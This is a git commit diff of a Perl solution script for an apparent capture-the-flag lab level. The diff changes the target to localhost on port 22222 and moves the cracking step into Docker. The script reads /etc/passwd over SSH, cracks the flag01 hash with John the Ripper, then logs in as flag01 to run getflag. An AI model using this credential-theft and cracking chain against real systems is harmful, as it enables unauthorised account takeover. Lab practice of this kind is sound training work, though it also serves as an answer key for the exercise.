5388fb0a851a2ab5cddf63e2884c9c8ba735930a
Louis Wyss <lwyss@c4r1p5.42nice.fr>
2024-03-22 16:38:03 +0100

    save

--- level01/resources/script.pl
+++ level01/resources/script.pl
@@ -1,14 +1,15 @@
 #!/usr/bin/perl
 
-$ip = @ARGV ? $ARGV[0] : "192.168.56.2";
-
+$port = "22222";
+$ip = "localhost";
 $red = "\e[31m";
 $green = "\e[32m";
 $reset = "\e[0m";
 
 $passwd = "cat /etc/passwd | grep flag01";
-$input = `ssh -qp 4242 level01\@$ip '$passwd'`;
+$input = `ssh -qp $port level01\@$ip '$passwd'`;
 @split = split(':', $input);
 $pass = $split[1];
-print $red, "$passwd\n", $reset, $input, "$pass\n", $green, `echo $pass > pass ; john pass --show | head -n 1 && rm pass`, $reset;
-system("ssh -qp 4242 flag01\@$ip 'getflag'");
+$docker = "docker run --rm -v ./pass:/home/john/pass nbaars/john-the-ripper sh -c './john /home/john/pass 2>/dev/null'";
+print $red, "$passwd\n", $reset, $input, "$pass\n", $green, `echo $pass > pass ; $docker | tail -n 1 && rm pass`, $reset;
+system("ssh -qp $port flag01\@$ip 'getflag'");
